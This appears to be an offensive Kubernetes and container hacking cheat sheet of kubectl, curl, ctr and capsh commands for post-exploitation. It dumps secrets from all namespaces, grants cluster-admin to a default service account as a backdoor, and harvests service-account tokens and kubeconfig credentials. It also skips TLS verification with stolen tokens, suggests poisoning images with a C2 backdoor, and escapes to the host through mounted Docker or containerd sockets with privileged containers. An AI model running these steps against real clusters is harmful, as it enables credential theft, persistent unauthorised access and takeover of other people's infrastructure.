[*] Commands for kubernetes capabilities
	kubectl auth can-i '*' '*'
	kubectl auth can-i --list --namespace=foo
	kubectl auth can-i create pods
	kubectl auth can-i list pods
	kubectl get nodes

[*] Commands to pull secrets
        kubectl get secrets --all-namespaces
	kubectl describe secrets --all-namespace
		you can also limit namespaces to --namespace foo

[*] Kubernetes Backdoor access
	kubectl create clusterrolebinding <service> --clusterrole cluster-admin --serviceaccount=default:default
		Give a vulnerable pod clusterrole perm in default namespaces
		Use any name you want for <service>, this is not dependant on anything at this point.
		serviceacounts may be listed from an admin kubectl by running:
			kubectl get serviceaccounts --all-namespaces
		Example:
			kubectl create clusterrolebinding get-schwifty --clusterrole cluster-admin --serviceaccount=namespace-name:default

[*] Get current pod capabilities and/or how deployed
	kubectl get pods
	kubectl get pods --all-namespaces
		this may not work if you are limited to your own namespace
	kubectl describe pod <hostname> --namespace <your namespace>
        kubectl describe pod <hostname> --namespace <your namespace> -o yaml
		if the command exists, run "hostname" or "hostnamectl" to get your pod name. /etc/hosts should have this as well.
		Very useful to find where the image is stored. IF you can compromise the image and image pull policy is "Always",
		then you have potential for pod takeover whereever this image is deployed as a container. Integrate C2 backdoor.

[*] Tricks
	Assuming you find RCE on vulnerable pod upload kubectl binary to pod and start running above commands
	Don't forget about Docker. Some clusters will have Docker installed. Use Docker to mount host file system.

[*] Backdoor images and configs
	

[*] Useful content to learn kubernetes hacking
	https://www.youtube.com/watch?v=KSBs_8ZGPvs

[*] Recon and Enumeration
	On Node:
		Kubelet Credentials
		Neighboring Pods' service acounts
	Know your Nodes
		What pods run on your node?
			Apps
			Add-ons (Prometheus, istio)
			System (kube-proxy, coredns)
		Permissions blind spot: system and addon pods
			Daemonsets on all nodes
				Compromising a pod creates a privilege escalation scenario of pod hopping.
				Daemonsets run on all nodes. Compromise a daemonset, you have access to all nodes.

	Trampoline pods:
		Manipulate Authn/Authz
			Update roles of current tokens to obtain more access
		Aquire Tokens
			Service Account tokens that can be abused to further permissions
		Execute code (Remote Code Execution)
			Self explantory, can I get RCE on another more privileged pod?
		Steal pods
			Force a pod to move around that we know can be abused.
			If I own a node, can I get a more privileged pod to move to my compromised node?


[*] ktokctl.sh:
	#!/bin/bash
	set -e
	apiserver=$(cat /var/lib/kubectl/kubeconfig | grep 'server: ' | awk '{printf $2}')
	token=SERVICEACCOUNTTOKEN
	kubectl --token $token --server $apiserver --insecure-skip-tls-verify "$@"

	Example:
		ktokctl.sh auth can-i escalate clusterroles
		ktokctl.sh auth can-i "*" "*" -A


[*] cURL requests
	Depending on the k8s environment, you will be able to use curl requests.
	Parts list:
		ca.crt
		client.crt
		client.key
	Example:
		curl --cert client.crt --key client.key --cacert ca.crt https://<KUBERNETES_API_SERVER>/api/v1/namespaces/default/pods
	This changes when you are using cloud services or service accounts. AWS EKS and service accounts rely on Tokens.
	Parts list:
		ca.crt
		token
	AWS command example to retrieve:
		aws eks update-kubeconfig --region <region> --name <cluster-name>
		aws eks get-token --cluster-name <cluster-name> --region <region> | jq -r '.status.token'
	Example places to look for these parts lists:
		~/.kube/config # On a compromised dev environment, like a laptop
		/run/secrets/kubernetes.io/serviceaccount/* # This is within a pod
		/run/secrets/kubernetes.io/serviceaccount/ca.crt
		/run/secrets/kubernetes.io/serviceaccount/token
		/run/secrets/kubernetes.io/serviceaccount/namespace
	Example cURL:
		export TOKEN="k8s-aws-v1.XXXXXXX"
		curl --cacert ca.crt -H "Authorization: Bearer $TOKEN" https://my-cluster-api-server-url/api/v1/namespaces/default/pods
	But where is my api endpoint? Use kubernetes DNS to resolve this. Example:
		~$ host kubernetes.default.svc && echo
		kubernetes.default.svc.cluster.local has address 10.100.0.1
		curl --cacert ca.crt -H "Authorization: Bearer $TOKEN" https://10.100.0.1/api/v1
	Another option is to search for "server" in the ~/.kube/config file.

[*] Capabilities
	Although capabilities are specific to Linux, creating granularity with permissions, capabilities will play an important role with containers.
	If deployments specify dropping capabilities, your chance of priv esc drops significantly.

	Get familiar with capabilities, they can be found in man pages:
		man capabilities

	Take a look at capabilities for an executable:
		└─$ getcap /usr/bin/ping
		/usr/bin/ping cap_net_raw=ep

	Set capabilities:
		sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap

	Now to use them, you need to enable via the command:
		nmap --privileged 10.10.10.10

	Check your current session capabilities:
	Read this over to understand - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
		cat /proc/$$/status | grep -i cap
	Take the hex and convert to human readable:
		capsh --decode=000001ffffffffff
	You can also take the pid and check that as well:
		getpcaps <PID>
	You can also drop capabilities:
		capsh --drop=cap_net_raw,cap_net_admin,cap_net_bind_service+eip --print -- -c /usr/bin/nmap
	Easiest way to drop capabilities:
		sudo setcap -r /usr/bin/nmap
	Print your current capabilities:
		capsh --print

[*] Containerd

Chech if ctr exist on the pod/container:
	which ctr

If working from within a container, and have access to host file system, we may need to set the socker manually:
	ctr -a="/mnt/var/run/containerd/containerd.sock" image list
	REF TYPE DIGEST SIZE PLATFORMS LABELS

No image? Try pulling one:
	ctr -a="/mnt/var/run/containerd/containerd.sock" image pull docker.io/library/python:3
	ctr -a="/mnt/var/run/containerd/containerd.sock" image list
	REF                           TYPE                                                      DIGEST                                                                  SIZE      PLATFORMS                                                                                              LABELS
docker.io/library/python:3    application/vnd.docker.distribution.manifest.list.v2+json sha256:a25e0cf180ee1bbbc103bb39508fb12b75020427abaaff83bec5999454c3735f 362.9 MiB linux/386,linux/amd64,linux/arm/v5,linux/arm/v7,linux/arm64/v8,linux/ppc64le,linux/s390x,windows/amd64 -

Cool, can we run it? If the below runs, we are in.
	ctr -a="/mnt/var/run/containerd/containerd.sock" run -t --privileged --net-host docker.io/library/python:3 mypod
	

